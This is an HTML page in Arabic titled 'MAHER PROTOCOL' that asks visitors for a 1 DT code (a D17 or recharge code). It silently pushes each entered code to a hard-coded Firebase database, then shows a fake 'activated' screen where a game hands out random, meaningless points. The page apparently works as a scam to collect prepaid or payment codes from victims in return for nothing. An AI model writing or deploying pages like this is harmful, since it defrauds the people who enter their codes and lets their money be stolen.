<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>MAHER | THE VAULT</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <style>
        body { background: #050505; color: #00ff41; font-family: monospace; text-align: center; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .box { border: 2px solid #00ff41; padding: 20px; width: 350px; }
        input, button { width: 100%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #00ff41; color: #fff; }
        button { background: #00ff41; color: #000; font-weight: bold; cursor: pointer; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="box">
    <h1>MAHER PROTOCOL</h1>
    
    <div id="step-1">
        <p>أدخل كود 1 DT (D17 أو شحن)</p>
        <input type="text" id="code" placeholder="أدخل الكود هنا">
        <button onclick="sendData()">إرسال وتفعيل</button>
    </div>

    <div id="step-2" class="hidden">
        <h2>تم التفعيل</h2>
        <p>نقاطك: <span id="pts">0</span></p>
        <button onclick="addPoints()">العب الآن واربح نقاط</button>
    </div>
</div>

<script>
    // الإعدادات مأخوذة من صورتك مباشرة
    const firebaseConfig = {
        databaseURL: "https://m-token-5ce65-default-rtdb.europe-west1.firebasedatabase.app/"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function sendData() {
        const c = document.getElementById('code').value;
        if(c.length < 4) return alert("الكود قصير");

        // سيقوم هذا السطر بإنشاء البيانات فوراً في Firebase التي كانت فارغة في صورتك
        db.ref('test_entries').push({
            code_sent: c,
            status: "active"
        });

        document.getElementById('step-1').classList.add('hidden');
        document.getElementById('step-2').classList.remove('hidden');
    }

    function addPoints() {
        let p = Math.floor(Math.random() * 100);
        document.getElementById('pts').innerText = p;
        alert("ربحت " + p + " نقطة!");
    }
</script>
</body>
</html>
